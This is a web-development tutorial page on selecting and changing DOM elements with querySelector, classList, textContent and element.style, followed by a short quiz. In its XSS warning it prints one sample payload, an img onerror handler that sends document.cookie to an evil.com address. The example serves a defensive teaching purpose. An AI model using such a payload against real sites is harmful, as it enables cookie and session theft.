---
title: "Selecting and Modifying Elements"
guide: "the-dom-explained"
phase: 2
summary: "How to find elements with querySelector and querySelectorAll, change classes with classList, set text safely with textContent instead of innerHTML, and read or write inline styles."
tags: [dom, javascript, web-fundamentals, queryselector, xss]
difficulty: intermediate
synonyms: ["queryselector vs getelementbyid", "textcontent vs innerhtml", "classlist toggle example", "how to change element style with javascript"]
updated: 2026-07-06
---

# Selecting and Modifying Elements

Working with the DOM comes down to two steps: find the node, then change it. This phase covers both,
using one running example - a card component you'll select and mutate several different ways.

```html
<div class="card" id="pricing-card">
  <h3 class="card-title">Pro Plan</h3>
  <p class="card-price">$12/mo</p>
  <button class="card-btn">Subscribe</button>
</div>
```

## Finding elements

`document.querySelector(selector)` returns the **first** matching element, using normal CSS selector
syntax - the same syntax you already know from stylesheets:

```js
const card = document.querySelector('.card');
const title = document.querySelector('#pricing-card .card-title');
const button = document.querySelector('.card-btn');
```

`document.querySelectorAll(selector)` returns **every** match, as a static NodeList. Loop it with
`forEach`:

```js
document.querySelectorAll('.card').forEach(card => {
  console.log(card.querySelector('.card-price').textContent);
});
```

You'll also see `getElementById('pricing-card')` and `getElementsByClassName('card')` in older code.
They're faster in theory but pickier about syntax (no CSS selectors, no combinators) and
`getElementsByClassName` returns a **live** collection that updates as the DOM changes, which surprises
people. `querySelector`/`querySelectorAll` cover nearly everything and read the same as CSS - default to
them.

## Changing classes with classList

Toggling a CSS class is the normal way to change appearance or state from JavaScript - the styling stays
in CSS, JavaScript just flips a switch:

```js
button.classList.add('is-loading');      // add a class
button.classList.remove('is-loading');   // remove it
button.classList.toggle('is-active');    // add if missing, remove if present
button.classList.contains('is-active');  // true/false check
```

A "Subscribe" button that disables itself and shows a spinner while a request is in flight:

```js
button.addEventListener('click', () => {
  button.classList.add('is-loading');
  button.disabled = true;
});
```

The CSS (`.is-loading { opacity: 0.6; cursor: wait; }`) lives in your stylesheet, untouched by this
guide - see [CSS Without Tears](/guides/css-without-tears) if that part is unfamiliar.

## textContent vs. innerHTML

Both set an element's contents. They are not interchangeable.

`textContent` sets or reads **plain text**. Anything you assign is treated as text, never parsed as
markup:

```js
title.textContent = 'Enterprise Plan';
```

`innerHTML` sets or reads **HTML**, parsing tags in the string:

```js
title.innerHTML = 'Enterprise <em>Plan</em>';
```

That parsing is the danger. If the string ever contains user input, `innerHTML` will execute it -
including `<script>` tags and event handler attributes. This is a real, common vulnerability class
called **cross-site scripting (XSS)**:

```js
// DANGEROUS if `comment` came from a user
reviewBox.innerHTML = comment;
// A comment of `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`
// runs immediately, in your page, with your users' cookies.
```

The fix: use `textContent` for anything that isn't HTML you wrote yourself.

```js
reviewBox.textContent = comment; // renders the tags as literal text, doesn't execute anything
```

Rule of thumb: reach for `textContent` by default. Only use `innerHTML` for trusted, static markup you
control - never for anything that came from a user, a URL parameter, or an API response you don't fully
trust.

## Reading and writing inline styles

`element.style` reads and writes inline CSS directly on the element, using camelCase property names:

```js
card.style.border = '2px solid #4f46e5';
card.style.backgroundColor = '#f5f5ff';   // not background-color

card.style.border; // '2px solid #4f46e5' - only reads inline styles you (or a script) set directly
```

`element.style` only sees styles set inline (via the `style` attribute or this API) - it won't show you
rules that apply from an external stylesheet. To read the actual computed value, regardless of where it
comes from, use `getComputedStyle(card).border`.

Inline styles via `.style` are fine for one-off, dynamic values (a progress bar's width, a
drag-and-drop position). For anything conditional or reusable, toggle a class instead and let CSS own
the actual values - it's easier to find, easier to override, and doesn't fight your stylesheet's
specificity.

Test what stuck:

```quiz
[
  {
    "q": "What's the main risk of setting `element.innerHTML = userInput`?",
    "choices": ["It's slightly slower than textContent", "It parses the string as HTML, so malicious markup or scripts can execute (XSS)", "It only works on <div> elements"],
    "answer": 1,
    "explain": "innerHTML parses its argument as markup. Untrusted input can include scripts or event handlers that run in your page - the classic XSS vector. textContent treats the same string as inert text."
  },
  {
    "q": "What does `document.querySelectorAll('.tag')` return?",
    "choices": ["The first element matching .tag", "A NodeList of every element matching .tag", "A single string of matching HTML"],
    "answer": 1,
    "explain": "querySelectorAll always returns a NodeList (possibly empty), even if only one element matches. querySelector returns just the first match."
  },
  {
    "q": "Why prefer toggling a CSS class over setting `element.style` properties directly for most UI state changes?",
    "choices": ["element.style doesn't work in modern browsers", "Classes keep the actual style values in CSS, making them easier to find, reuse, and override", "classList.toggle is faster to type"],
    "answer": 1,
    "explain": "Inline styles set via .style live only in JavaScript and win every CSS specificity fight, making them harder to override. Classes keep styling declarative and centralized in your stylesheet."
  }
]
```

---

[← Phase 1: The DOM Is Not the HTML](01-the-dom-is-not-the-html.md) · [Guide overview](_guide.md) · [Phase 3: Events: Listening, Bubbling, and Delegation →](03-events-listening-bubbling-and-delegation.md)
